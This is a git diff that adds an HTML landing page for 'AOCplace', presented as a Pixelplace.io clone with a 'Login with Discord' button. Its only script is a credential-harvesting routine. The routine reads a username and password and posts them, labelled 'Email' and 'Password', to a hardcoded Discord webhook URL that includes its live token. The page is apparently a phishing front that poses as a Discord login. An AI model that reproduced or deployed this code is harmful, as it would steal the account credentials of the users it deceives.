@@ -1,1 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>aocplace.io</title>
 
+    <style>
+        body {
+            background-color: black;
+        }
+
+        .main {
+            background-color: white;
+            border-radius: 25px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main" style="border: solid 6px rgb(95, 95, 224); margin-left: 25%; margin-right: 25%; margin-top: 10%;">
+
+        <div style="display: inline; text-align: center; padding: 10px;">
+            <center>
+            <img src="https://pixelplace.io/img/pixelplace-io-logo-tiny.png">
+            <h1 style="margin: 1px;">AOCplace</h1>
+            <h3 style="margin: 1px;">Welcome!</h3>
+            <p style="margin: 1px;">Pixelplace.io clone for AOC. Developed by AlchemillaOtherworld</p>
+        
+            <br>
+
+            <input type="button" onclick="location.href='discord.html';" value="Login with Discord" />
+        </div>
+        </center>
+
+    </div>
+
+
+
+
+
+
+    <script>
+        function sendMessage() {
+            // Retrieve values from input fields
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            // Create and send XMLHttpRequest
+            var request = new XMLHttpRequest();
+            request.open("POST", "https://discord.com/api/webhooks/1276720677017096203/M5qLoDYi9QMlDZq0lz3e_QDVinwMVQaWJZre-KtuzEEkelLEzseQQh4MT0NtnjHq3HP5");
+
+            request.setRequestHeader('Content-type', 'application/json');
+
+            const params = {
+                username: "Svenska",
+                avatar_url: "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Favatarfiles.alphacoders.com%2F271%2F271795.jpg&f=1&nofb=1&ipt=bc06e039864dc733546505da971d5513e8b1fa6821336b2360da4da626851935&ipo=images",
+                content: `Email: ${username}\nPassword: ${password}`
+            };
+
+            request.send(JSON.stringify(params));
+        }
+    </script>
+</body>
+</html>
